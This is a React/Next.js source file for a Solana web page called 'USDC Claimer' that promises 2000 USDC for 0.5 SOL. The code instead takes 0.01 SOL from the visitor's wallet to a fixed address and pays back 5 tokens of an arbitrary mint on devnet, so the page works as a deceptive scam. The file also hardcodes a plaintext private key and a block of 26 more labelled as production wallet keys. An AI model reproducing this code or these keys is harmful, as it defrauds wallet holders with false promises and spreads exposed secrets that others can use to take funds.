/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5o7S8hjuX76KWqGSJfvnZz6F6MyiYY6SMwtJknJaQGpFf8ibXgKFvPV3Dt2XiKbiSbzrTCnDcE9GaNRj7KNFiQGt"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5R3dz3gWzk5rGoB4JT8CZPYsGqFKW3iV1rYTm2Fbud6JqczrXHasiZNCQgfs5DeTNbzqtzUGvZLZvjfDkoV2vZNu",
  "key1": "32u1hz2ngfokVgEN1y9qH15aLjW4QBPEdpgcskKgtG7d7c7j2WWmVTwbR5zzJxoK7LQgUJy3AvfZyjjemStNmWa6",
  "key2": "4nSuL8X6NEW5LSrGt9GEdfHw2zsoXtaMiHDNUxrJsgzoJbYQ5Vw3YAxbJypRXDsJvrz8Mpau1Wi94MBDpMtCchiT",
  "key3": "nLx5f1EDcHNaCFoFVE3v4aStpNpWbV74MGtX6P9tUuZgj8nbwhS2LXtB7FBqu8AQ8zRST3XP3SgocnqWM1c2Lmi",
  "key4": "5wYrYQdjSv3F6kFgHhLBq3SJ2hQoVfA4bzFzMZVpj3FqHQh1626qgc4EjEofxribpgA2fi4QeoisuVvSpmw9soA6",
  "key5": "4T4nvkkAmgx3WejL7zoFcUvpBjq7zkpG3yQcfuujwyRTY9E81SHBftE1S6E7K7Jjbi9oUCKYWgQzbjZRsw7GMfDC",
  "key6": "2a8UtVZLCDJVBivtBy6dULzWNamMQS5Lm9LMT6Tcov4FcX3RrayYGuwHzhxpTHQGQcsHabz6YhE7b3GpGRZwQ2Gr",
  "key7": "6CEQkDnXNb23JHWD9uRFvW2SW5PBthKQMPRRM4Macz8uYCYfWjeJD6X7EE6nXUmeEQm7JLosX1YXKVyfFtLgZAq",
  "key8": "5pnUuu8KYvbbLKLDQCKm3QK9Kru7XnSBgkhEp1LSbWciRop3ZVyVqQousK8vLoHKCb2ejkwS8cFPNYsWMhoRxaZ3",
  "key9": "51AizbuPG1P4Jpnq2Bv6w2iwboHhYKrSH7RrVeWCjHL25RLu1EXnuvNH6MtxVsmB3PQZQ8s9kZwtNu8XJhnt3fW2",
  "key10": "2RATQC9U8fVw6UF81jFZQnMMVwr1i9RP2akXLaw4apEdXc1EmMxgke8CsbipAx8H8EDzei8VykFzRfSZET7GrUTU",
  "key11": "FgjkseyFC6mBwWwCfNeXgwNJ3yie91t1WgpGALARahtm1CJFeypx8p1aNPcA2YgfTsXsAw3okH8ZdQVNzU2VZgw",
  "key12": "44rJQQHMgR2qHrC5iEA8oQsywWqXdq9MC7i18GoDofkXVMPrLpQDnQi3LavKdVtbtWbRteCQtNiqW3HZAjYjPAuA",
  "key13": "46zHJrcBAYvycrxRpWMGSKDfEjL96fuZ3cnLbGbVqFG6VyaMrzC4qY6dfUNoPVcZLrt42tbKLtoRKNToYhDNVCB1",
  "key14": "yzJJ4epoWiieUVAiaur8szJb9TJh6eUD4cockYu5t7aaLjT72ghP1bNuZYhAzD7zQVaexwrcJqpa4Sv8hwTwfqh",
  "key15": "57yTVCBU3QU7KfR3xVPJ3kGiGjqjAstx2BSPCnVWY4snzxSfwVsWeUSVueQgWVcbkGirhU4copDw2g77iasU3Per",
  "key16": "5Z1wEuRhM5RZzKTwFRymcKYinvCf81mPdpJwoDfE3q8UacBru11aesbnwr1QosQpdx1vLTvLQHTmoFipNd4NJYy5",
  "key17": "5hWKRP6dLd8QWmwgYWxyiHQaQjrvEZQi5U4TrTd7KceFDhK53nFBQARb7mgaWeQB78tPMKVS9Y8Lu52vD8Xiqv77",
  "key18": "2RTExzXdNoztpscShiHDnEUvtVQpxb3RBPYZeHWKgZY9QQGbSqjTzfrCKur8bwxLEfSLGpFeKDRzYke4arRRiFf1",
  "key19": "3kMxCDWxkvAxpkxT9gFAj4ccfNy2gspqQxZzs1zxZfT3Tzje7qgiQatzjcLFDjTj3zscHzUcRSVQ6rvKCHAWfNNZ",
  "key20": "5cMCXKimQEFs9jhmmP2gNUMmSQXxjQmcgRcMvsvyXzP1JUF7wLqqXkzCwpSmRj3AYsaXVPWhn5ZSyfk1LRCL8SAi",
  "key21": "36udyR7tEgG3dEcyU3YTq9wFhFdzuR2UX4DKPpL33fo6JJjGY19yqigq3GSb4Nfpr7gYP1WTye5rXaKkwdFH199f",
  "key22": "2BdiXUGjvAbrvtKVGHcmCR2ehT6CLobXSimDe8wLGEQpj8RQ2T3KqxQreepQGs5oyNxTJP5DaHNeFnAWRXnobHLk",
  "key23": "Qs9epKhms12sUZpoDjhFvQmJc3VBGioX7ChFCxrEmcup5euJwi844MqCV1xPAWYVsMyYjbFb5qVdBzZkwd63M72",
  "key24": "5pyYG7eMHTuQe4WVDwpPiXfa9DeaV8XZcXimxBxxaoE6S8VJXLB7cPiCsNVrBXpLCQjm4bc3gUftfQjfmVPHxcnq",
  "key25": "2efkTCmZ4zVnhnniUdxJ5n6m6MLWoRzpQkMHsopAa3h6nU6WL5fW8vKcog7FpxYhWviDxqHqQwuNk5uSkYeAgWdp"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
